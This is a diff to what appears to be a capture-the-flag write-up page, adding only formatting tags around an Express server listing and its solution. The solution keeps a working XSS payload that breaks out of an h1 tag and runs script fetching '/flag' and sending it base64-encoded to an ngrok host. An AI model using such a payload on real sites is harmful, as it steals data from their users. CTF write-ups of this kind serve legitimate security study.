@@ -28,6 +28,7 @@ layout:
 
 ## Source
 
+{% code overflow="wrap" %}
 ```js
 const express = require("express");
 const path = require("path");
@@ -106,9 +107,11 @@ app.listen(port, () => {
     console.log(`Server listening on port ${port}.`);
 });
 ```
+{% endcode %}
 
 ## Solution
 
+{% code overflow="wrap" %}
 ```html
 <!--
     1. Provide special chars "'&<> to bypass filter (since they're only checked once)
@@ -117,3 +120,4 @@ app.listen(port, () => {
 -->
 "'&<></h1><script>fetch('/flag').then(r => { r.text().then(t => { fetch('https://0e00-81-103-153-174.ngrok.io/?flag=' + btoa(t), { 'mode': 'no-cors' }) }) })</script>
 ```
+{% endcode %}
